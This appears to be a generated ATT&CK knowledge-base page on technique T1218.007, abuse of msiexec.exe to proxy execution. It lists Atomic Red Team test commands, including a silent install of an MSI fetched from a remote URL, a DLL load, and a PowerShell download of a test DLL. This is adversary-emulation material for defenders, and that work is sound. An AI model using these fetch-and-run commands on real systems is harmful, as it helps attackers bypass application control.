
# Msiexec

## Description

### MITRE Description

> Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) Msiexec.exe is digitally signed by Microsoft.

Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse.

## Aliases

```

```

## Additional Attributes

* Bypass: ['Digital Certificate Validation', 'Application control']
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1218/007

## Potential Commands

```
msiexec.exe /q /i "PathToAtomicsFolder\T1218.007\src\Win32\T1218.msi"
msiexec.exe /q /i "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/Win32/T1218.msi"
msiexec.exe /y "PathToAtomicsFolder\T1218.007\src\x64\T1218.dll"
```

## Commands Dataset

```
[{'command': 'msiexec.exe /q /i '
             '"PathToAtomicsFolder\\T1218.007\\src\\Win32\\T1218.msi"\n',
  'name': None,
  'source': 'atomics/T1218.007/T1218.007.yaml'},
 {'command': 'msiexec.exe /q /i '
             '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/Win32/T1218.msi"\n',
  'name': None,
  'source': 'atomics/T1218.007/T1218.007.yaml'},
 {'command': 'msiexec.exe /y '
             '"PathToAtomicsFolder\\T1218.007\\src\\x64\\T1218.dll"\n',
  'name': None,
  'source': 'atomics/T1218.007/T1218.007.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Signed Binary Proxy Execution: Msiexec': {'atomic_tests': [{'auto_generated_guid': '0683e8f7-a27b-4b62-b7ab-dc7d4fed1df8',
                                                                                      'dependencies': [{'description': 'T1218.msi '
                                                                                                                       'must '
                                                                                                                       'exist '
                                                                                                                       'on '
                                                                                                                       'disk '
                                                                                                                       'at '
                                                                                                                       'specified '
                                                                                                                       'location '
                                                                                                                       '(#{msi_payload})\n',
                                                                                                        'get_prereq_command': 'Write-Host '
                                                                                                                              '"You '
                                                                                                                              'must '
                                                                                                                              'provide '
                                                                                                                              'your '
                                                                                                                              'own '
                                                                                                                              'MSI"\n',
                                                                                                        'prereq_command': 'if '
                                                                                                                          '(Test-Path '
                                                                                                                          '#{msi_payload}) '
                                                                                                                          '{exit '
                                                                                                                          '0} '
                                                                                                                          'else '
                                                                                                                          '{exit '
                                                                                                                          '1}\n'}],
                                                                                      'dependency_executor_name': 'powershell',
                                                                                      'description': 'Execute '
                                                                                                     'arbitrary '
                                                                                                     'MSI '
                                                                                                     'file. '
                                                                                                     'Commonly '
                                                                                                     'seen '
                                                                                                     'in '
                                                                                                     'application '
                                                                                                     'installation. '
                                                                                                     'The '
                                                                                                     'MSI '
                                                                                                     'opens '
                                                                                                     'notepad.exe '
                                                                                                     'when '
                                                                                                     'sucessfully '
                                                                                                     'executed.\n',
                                                                                      'executor': {'command': 'msiexec.exe '
                                                                                                              '/q '
                                                                                                              '/i '
                                                                                                              '"#{msi_payload}"\n',
                                                                                                   'name': 'command_prompt'},
                                                                                      'input_arguments': {'msi_payload': {'default': 'PathToAtomicsFolder\\T1218.007\\src\\Win32\\T1218.msi',
                                                                                                                          'description': 'MSI '
                                                                                                                                         'file '
                                                                                                                                         'to '
                                                                                                                                         'execute',
                                                                                                                          'type': 'Path'}},
                                                                                      'name': 'Msiexec.exe '
                                                                                              '- '
                                                                                              'Execute '
                                                                                              'Local '
                                                                                              'MSI '
                                                                                              'file',
                                                                                      'supported_platforms': ['windows']},
                                                                                     {'auto_generated_guid': 'bde7d2fe-d049-458d-a362-abda32a7e649',
                                                                                      'description': 'Execute '
                                                                                                     'arbitrary '
                                                                                                     'MSI '
                                                                                                     'file '
                                                                                                     'retrieved '
                                                                                                     'remotely. '
                                                                                                     'Less '
                                                                                                     'commonly '
                                                                                                     'seen '
                                                                                                     'in '
                                                                                                     'application '
                                                                                                     'installation, '
                                                                                                     'commonly '
                                                                                                     'seen '
                                                                                                     'in '
                                                                                                     'malware '
                                                                                                     'execution. '
                                                                                                     'The '
                                                                                                     'MSI '
                                                                                                     'opens '
                                                                                                     'notepad.exe '
                                                                                                     'when '
                                                                                                     'sucessfully '
                                                                                                     'executed.\n',
                                                                                      'executor': {'command': 'msiexec.exe '
                                                                                                              '/q '
                                                                                                              '/i '
                                                                                                              '"#{msi_payload}"\n',
                                                                                                   'name': 'command_prompt'},
                                                                                      'input_arguments': {'msi_payload': {'default': 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/Win32/T1218.msi',
                                                                                                                          'description': 'MSI '
                                                                                                                                         'file '
                                                                                                                                         'to '
                                                                                                                                         'execute',
                                                                                                                          'type': 'String'}},
                                                                                      'name': 'Msiexec.exe '
                                                                                              '- '
                                                                                              'Execute '
                                                                                              'Remote '
                                                                                              'MSI '
                                                                                              'file',
                                                                                      'supported_platforms': ['windows']},
                                                                                     {'auto_generated_guid': '66f64bd5-7c35-4c24-953a-04ca30a0a0ec',
                                                                                      'dependencies': [{'description': 'T1218.dll '
                                                                                                                       'must '
                                                                                                                       'exist '
                                                                                                                       'on '
                                                                                                                       'disk '
                                                                                                                       'at '
                                                                                                                       'specified '
                                                                                                                       'location '
                                                                                                                       '(#{dll_payload})\n',
                                                                                                        'get_prereq_command': 'New-Item '
                                                                                                                              '-Type '
                                                                                                                              'Directory '
                                                                                                                              '(split-path '
                                                                                                                              '#{dll_payload}) '
                                                                                                                              '-ErrorAction '
                                                                                                                              'ignore '
                                                                                                                              '| '
                                                                                                                              'Out-Null\n'
                                                                                                                              'Invoke-WebRequest '
                                                                                                                              '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/x64/T1218.dll" '
                                                                                                                              '-OutFile '
                                                                                                                              '"#{dll_payload}"\n',
                                                                                                        'prereq_command': 'if '
                                                                                                                          '(Test-Path '
                                                                                                                          '#{dll_payload}) '
                                                                                                                          '{exit '
                                                                                                                          '0} '
                                                                                                                          'else '
                                                                                                                          '{exit '
                                                                                                                          '1}\n'}],
                                                                                      'dependency_executor_name': 'powershell',
                                                                                      'description': 'Execute '
                                                                                                     'arbitrary '
                                                                                                     'DLL '
                                                                                                     'file '
                                                                                                     'stored '
                                                                                                     'locally. '
                                                                                                     'Commonly '
                                                                                                     'seen '
                                                                                                     'in '
                                                                                                     'application '
                                                                                                     'installation.\n'
                                                                                                     'Upon '
                                                                                                     'execution, '
                                                                                                     'a '
                                                                                                     'window '
                                                                                                     'titled '
                                                                                                     '"Boom!" '
                                                                                                     'will '
                                                                                                     'open '
                                                                                                     'that '
                                                                                                     'says '
                                                                                                     '"Locked '
                                                                                                     'and '
                                                                                                     'Loaded!". '
                                                                                                     'For '
                                                                                                     '32 '
                                                                                                     'bit '
                                                                                                     'systems '
                                                                                                     'change '
                                                                                                     'the '
                                                                                                     'dll_payload '
                                                                                                     'argument '
                                                                                                     'to '
                                                                                                     'the '
                                                                                                     'Win32 '
                                                                                                     'folder.\n'
                                                                                                     'By '
                                                                                                     'default, '
                                                                                                     'if '
                                                                                                     'the '
                                                                                                     'src '
                                                                                                     'folder '
                                                                                                     'is '
                                                                                                     'not '
                                                                                                     'in '
                                                                                                     'place, '
                                                                                                     'it '
                                                                                                     'will '
                                                                                                     'download '
                                                                                                     'the '
                                                                                                     '64 '
                                                                                                     'bit '
                                                                                                     'version.\n',
                                                                                      'executor': {'command': 'msiexec.exe '
                                                                                                              '/y '
                                                                                                              '"#{dll_payload}"\n',
                                                                                                   'name': 'command_prompt'},
                                                                                      'input_arguments': {'dll_payload': {'default': 'PathToAtomicsFolder\\T1218.007\\src\\x64\\T1218.dll',
                                                                                                                          'description': 'DLL '
                                                                                                                                         'to '
                                                                                                                                         'execute',
                                                                                                                          'type': 'Path'}},
                                                                                      'name': 'Msiexec.exe '
                                                                                              '- '
                                                                                              'Execute '
                                                                                              'Arbitrary '
                                                                                              'DLL',
                                                                                      'supported_platforms': ['windows']}],
                                                                    'attack_technique': 'T1218.007',
                                                                    'display_name': 'Signed '
                                                                                    'Binary '
                                                                                    'Proxy '
                                                                                    'Execution: '
                                                                                    'Msiexec'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)


# Actors


* [Rancor](../actors/Rancor.md)

* [TA505](../actors/TA505.md)
    
